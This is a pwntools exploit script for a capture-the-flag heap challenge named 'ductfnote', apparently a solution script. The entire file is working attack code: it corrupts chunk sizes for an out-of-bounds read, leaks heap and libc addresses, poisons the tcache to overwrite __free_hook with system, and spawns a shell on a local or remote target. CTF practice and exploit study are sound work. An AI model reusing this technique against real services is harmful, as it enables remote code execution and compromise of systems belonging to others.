#!/usr/bin/python3
#coding=utf-8


from pwn import *

exe = ELF("../challenge/ductfnote")
libc = ELF("../challenge/libc-2.31.so")


is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process([exe.path])
    
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    



context.log_level = 'info'

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))


def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)



# allocate 0x7f chunk and corrupt the maxsize, then free the chunk

sla(">>", '1')
sla("Size: ", str(0x7f))
sla(">>", '3')



sl(p64(0)*26 + p32(0) + p64(0x21) + b'\xff'*2)
sla(">>", '4')



# allocate a bigger chunk (so that it isnt serviced by the above freed chunk, need to save this chunk for later)
sla(">>", '1')
sla("Size:", str(0x100))
#free it to tcache (heap pointers now in the chunk)
sla(">>", '4')



# recover the original chunk, corrupt its size to get OOB read and read a heap pointer
sla(">>", '1')
sla("Size:", str(0x7f))
sla(">>", '3')
sl(p64(0)*26 + p32(0) + p64(0x21) + p64(0xffff)  + p64(0)*2 + p64(0x110) + b'\xff\x0f')
sla(">>", '2')


p.recvline()
p.recvline()
leak = p.recvline();
leak = uu64(leak[276:283])

p.recvline()
sla(">>", '4')

my_chunk = leak + (0x5571a13492c0 - 0x5571a1349010)

big_chunk = leak + 0x550


log.info(f"big chunk: {hex(big_chunk)}")

#create an unsortedbin sized chunk and a buffer chunk to prevent consolidation:


sla(">>", '1')
sla("Size:", str(0x1000))



# this chunk acts as a buffer, but is also the biggest tcache size chunk we can make, so we use it for the arb write:

sla(">>", '1')
sla("Size:", str(0x370))

sla(">>", '4')



# we replace the pointer with the unsortedbin pointer so that we can free it

sla(">>", '1')
sla("Size:", str(0x7f))
sla(">>", '3')
sl(p64(0)*23 + p32(0) + p64(big_chunk))
sla(">>", '4')


#retrieve unsorted bin allocation and free it. Now we have a chunk with libc addresses 
sla(">>", '1')
sla("Size:", str(0x370))
sla(">>", '4')

# perform the OOB read (same as above)
sla(">>", '1')
sla("Size:", str(0x7f))
sla(">>", '3')
sl(p64(0)*26 + p32(0) + p64(0x21) + p64(0xffff) + p64(0)*2 + p64(0x110) + b'\xff\x0f')


sla(">>", '2')


p.recvline()
p.recvline()




leak = p.recvline();
leak = uu64(leak[668:675]) - (0x7fec2b9c6be0 - 0x00007fec2b7db000)

libc.address = leak
sla(">>", '4')


log.info(f"libc: {hex(libc.address)}")



# allocate this largest tcache bin again
sla(">>", '1')
sla("Size:", str(0x370))
sla(">>", '4')


#replace it with free_hook
sla(">>", '1')
sla("Size:", str(0x7f))
sla(">>", '3')
sl(p64(0)*23 + p32(0) + p64(libc.symbols['__free_hook'] - 4))
sla(">>", '4')


#write system to free_hook
sla(">>", '1')
sla("Size:", str(0x370))
sla(">>", '3')
sl(p64(libc.symbols['system']))




# create an allocation and place /bin/sh at its beginning. 
sla(">>", '1')
sla("Size:", str(0x170))
sla(">>", '3')



sl(p32(0) + p64(0) * 30 + p64(201) +  b"/bin/sh")
sla(">>", '4')


p.interactive()
